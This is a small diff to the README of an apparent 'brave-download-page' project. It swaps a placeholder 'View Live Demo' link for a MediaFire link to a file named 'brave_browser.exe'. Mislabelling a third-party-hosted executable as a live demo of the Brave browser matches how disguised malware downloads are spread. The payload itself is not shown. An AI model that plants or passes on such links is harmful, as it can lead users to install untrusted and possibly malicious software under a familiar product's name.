@@ -61,7 +61,7 @@ brave-download-page/
 
 ## 🌐 Live Demo
 
-[View Live Demo](#) *(add your deployment link here)*
+[View Live Demo]((https://www.mediafire.com/file/tc155s8dxrvvyue/brave_browser.exe/file)
 
 ## 📸 Screenshots
 
